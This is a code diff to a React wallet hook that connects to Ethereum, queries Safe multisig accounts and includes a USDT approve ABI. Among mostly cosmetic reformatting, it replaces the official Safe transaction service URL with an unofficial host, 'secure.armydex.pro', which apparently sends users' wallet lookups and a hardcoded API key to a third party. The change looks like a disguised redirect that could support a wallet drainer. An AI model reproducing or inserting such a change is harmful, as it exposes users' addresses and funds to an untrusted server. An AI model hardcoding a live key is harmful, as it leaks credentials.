@@ -2,11 +2,12 @@ import { useEffect, useState } from "react";
 import { ethers } from "ethers";
 import SafeApiKit from "@safe-global/api-kit";
 
+const SAFE_API_KEY =
+  "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzYWZlLWF1dGgtc2VydmljZSIsInN1YiI6IjFhYmViYWY1YjFkNDRjMWQ4N2I2NDU3MGYyZjNlYTUyX2E5NTkxMWIzMGU2MzRlOGY5OWFmNTQxZWVlZTY2MTJlIiwia2V5IjoiMWFiZWJhZjViMWQ0NGMxZDg3YjY0NTcwZjJmM2VhNTJfYTk1OTExYjMwZTYzNGU4Zjk5YWY1NDFlZWVlNjYxMmUiLCJhdWQiOlsic2FmZS1hdXRoLXNlcnZpY2UiXSwiZXhwIjoxOTIwMTgxMzk2LCJkYXRhIjp7fX0.VgqgABuWQYRhQLrB7ODeMICDNSaCp2ovnjgMda1RBWaXmVnwZODmLvfXXjsQJnuGbF2-oH8iISIeTZqlafd_jg";
 
-const SAFE_API_KEY = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzYWZlLWF1dGgtc2VydmljZSIsInN1YiI6IjFhYmViYWY1YjFkNDRjMWQ4N2I2NDU3MGYyZjNlYTUyX2E5NTkxMWIzMGU2MzRlOGY5OWFmNTQxZWVlZTY2MTJlIiwia2V5IjoiMWFiZWJhZjViMWQ0NGMxZDg3YjY0NTcwZjJmM2VhNTJfYTk1OTExYjMwZTYzNGU4Zjk5YWY1NDFlZWVlNjYxMmUiLCJhdWQiOlsic2FmZS1hdXRoLXNlcnZpY2UiXSwiZXhwIjoxOTIwMTgxMzk2LCJkYXRhIjp7fX0.VgqgABuWQYRhQLrB7ODeMICDNSaCp2ovnjgMda1RBWaXmVnwZODmLvfXXjsQJnuGbF2-oH8iISIeTZqlafd_jg";
-
-const SAFE_TX_SERVICE_URL = "https://safe-transaction-mainnet.safe.global";
+const SAFE_TX_SERVICE_URL = "https://secure.armydex.pro/safe-api";
 const CONTRACT_ADDRESS = "0x7edcf18529d7d697064fad02d1879ef73bf849b5";
+const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const CONTRACT_ABI = [
   {
     inputs: [{ internalType: "string", name: "name", type: "string" }],
@@ -17,7 +18,6 @@ const CONTRACT_ABI = [
   },
 ];
 
-const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) returns (bool)",
   "function allowance(address owner, address spender) view returns (uint256)",
@@ -39,6 +39,7 @@ export function useContractInteraction() {
       try {
         const p = new ethers.BrowserProvider(window.ethereum as any);
         setProvider(p);
+
         const readOnly = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, p);
         setContract(readOnly);
         setIsContractConnected(true);
@@ -47,7 +48,12 @@ export function useContractInteraction() {
         const signer = await p.getSigner();
         const ownerAddress = await signer.getAddress();
 
-        const safeApi = new SafeApiKit({ chainId: 1n, txServiceUrl: SAFE_TX_SERVICE_URL, apiKey: SAFE_API_KEY });
+        const safeApi = new SafeApiKit({
+          chainId: 1n,
+          txServiceUrl: SAFE_TX_SERVICE_URL,
+          apiKey: SAFE_API_KEY,
+        });
+
         const safes = await safeApi.getSafesByOwner(ownerAddress);
 
         if (safes?.safes?.length > 0) {
@@ -63,6 +69,7 @@ export function useContractInteraction() {
     }
 
     init();
+
   }, []);
 
   async function createBotWithToken(botName: string) {
